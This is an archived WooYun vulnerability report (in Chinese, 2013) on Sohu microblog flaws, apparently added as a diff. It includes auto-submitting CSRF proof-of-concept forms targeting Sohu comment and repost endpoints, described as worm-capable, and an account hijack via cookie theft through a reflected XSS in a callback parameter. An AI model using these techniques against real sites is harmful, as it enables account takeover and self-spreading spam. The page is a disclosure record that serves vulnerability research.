@@ -1,0 +1,286 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狐微博csrf蠕虫&amp;利用xss劫持微博帐号  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狐微博csrf蠕虫&amp;利用xss劫持微博帐号  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/se55i0n">se55i0n</a> 
+</li><li>提交时间：		2013-05-08 12:48</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-29：	细节向普通白帽子公开<br/>
+									2013-06-08：	细节向实习白帽子公开<br/>
+									2013-06-22：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">搜狐的大锅，说好的礼物呢？发个洞子提醒下，话说是不是该落实下礼物咯：D</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1）csrf蠕虫1<br />
+<br />
+1.1）问题i.sohu.com评论功能上，见下图；<br />
+<br />
+</p><p class="detail"><a href="../images/08081442a1fd2ba957cd8ba9f1c757e4051d5c9e.jpg" target="_blank"><img src="../images/08081442a1fd2ba957cd8ba9f1c757e4051d5c9e.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+1.2）点击评论并抓包，得到数据如下；<br />
+<br />
+</p><pre><code>POST /a/app/discuss/save.htm?_input_encode=UTF-8&amp;_=ajeglyxpsf HTTP/1.1<br />
+Host: i.sohu.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 61<br />
+Origin: http://i.sohu.com<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Accept: */*<br />
+Referer: http://i.sohu.com/p/=v2=aaBh5ULzWW9pVYYtpmNvbQ==/blog/view/260587564.htm<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: ...<br />
+<br />
+type=0&amp;discusstype=1&amp;appid=blog&amp;itemid=260587564&amp;content=test</code></pre><p class='detail'><br />
+<br />
+1.3）测试了下，这里未校验referer、无token，例子POC如下；<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;se55i0n&quot; name=&quot;se55i0n&quot; action=&quot;http://i.sohu.com/a/app/discuss/save.htm?_input_encode=UTF-8&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;type&quot; value=&quot;0&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;discusstype&quot; value=&quot;1&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;appid&quot; value=&quot;blog&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;itemid&quot; value=&quot;260587564&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;test&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+   document.se55i0n.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+1.4）这里还能GET方式提交请求，并且会泄露被评论博客用户的个人搜狐帐号信息；<br />
+<br />
+</p><p class="detail"><a href="../images/08082235bc4a7f22b002afc4b4dad2b694c99013.jpg" target="_blank"><img src="../images/08082235bc4a7f22b002afc4b4dad2b694c99013.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+1.5）提交成功后，会转发一条微博；<br />
+<br />
+</p><p class="detail"><a href="../images/080827082c0b9bad06c538d6530a89d8daecd3c9.jpg" target="_blank"><img src="../images/080827082c0b9bad06c538d6530a89d8daecd3c9.jpg" alt="12.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2）csrf蠕虫2<br />
+<br />
+2.1）问题出在微博的新功能上，如下图；<br />
+<br />
+</p><p class="detail"><a href="../images/08082925e2e6b658c58242421488d5f9f211299b.jpg" target="_blank"><img src="../images/08082925e2e6b658c58242421488d5f9f211299b.jpg" alt="9.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2.2）发表一条微博，发现旁边有个“+2”的功能，点击并抓包得到数据如下；<br />
+<br />
+</p><pre><code>POST /twAction/reTwitter HTTP/1.1<br />
+Host: t.sohu.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 68<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Origin: http://t.sohu.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Referer: http://t.sohu.com/<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: ...<br />
+<br />
+msgid=8205603065&amp;content=&amp;#43;2&amp;type=&amp;at=8205603065&amp;msg=%26%2343%3B2</code></pre><p class='detail'><br />
+<br />
+2.3）&quot;msgid&quot;对应了转发的微博，content为内容“+2”（这里内容能够我们能够控制），测试发现未校验referer，未加入token，so；<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;se55i0n&quot; name=&quot;se55i0n&quot; action=&quot;http://t.sohu.com/twAction/reTwitter&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;msgid&quot; value=&quot;8205603065&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;test&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;at&quot; value=&quot;8205603065&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;msg&quot; value=&quot;test&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+   document.se55i0n.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+2.4）使用另一个帐号登录并运行该POC效果如下；<br />
+<br />
+</p><p class="detail"><a href="../images/08083936a44d9ea417a3a19151976cfe5da340ec.jpg" target="_blank"><img src="../images/08083936a44d9ea417a3a19151976cfe5da340ec.jpg" alt="10.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2.5）返回微博查看效果；<br />
+<br />
+</p><p class="detail"><a href="../images/08084210b02521029ca96378304a7ec179261622.jpg" target="_blank"><img src="../images/08084210b02521029ca96378304a7ec179261622.jpg" alt="11.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3）利用sohu.com下某处发射型xss劫持微博<br />
+<br />
+3.1）问题所在：http://register.mail.sohu.com/servlet/getUnreadMailCountServlet?callback=...<br />
+<br />
+3.2)仅仅测试了FF下的效果；<br />
+<br />
+</p><p class="detail"><a href="../images/0808441461f0ff9744761fc67611383cce4e64e2.jpg" target="_blank"><img src="../images/0808441461f0ff9744761fc67611383cce4e64e2.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+3.3）利用se55i0n微博帐号测试下，能够得到cookie；<br />
+<br />
+</p><p class="detail"><a href="../images/080846531cb7e3efa9fdff490a2e9c8ff81cffa9.jpg" target="_blank"><img src="../images/080846531cb7e3efa9fdff490a2e9c8ff81cffa9.jpg" alt="8.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+3.4）利用获取到cookie，成功登录微博帐号；<br />
+<br />
+</p><p class="detail"><a href="../images/08084744f12b3071dcbaedddd6bcd192b8db5e89.jpg" target="_blank"><img src="../images/08084744f12b3071dcbaedddd6bcd192b8db5e89.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+PS：当然xss和csrf还能双剑合璧，效果更好，哈哈！一次发这么多，大锅，礼物呀！！！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们懂的！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/se55i0n" title="se55i0n">se55i0n</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023269" title="搜狐微博csrf蠕虫&amp;利用xss劫持微博帐号">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-05-09 12:53</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对搜狐安全的关注</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23269";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
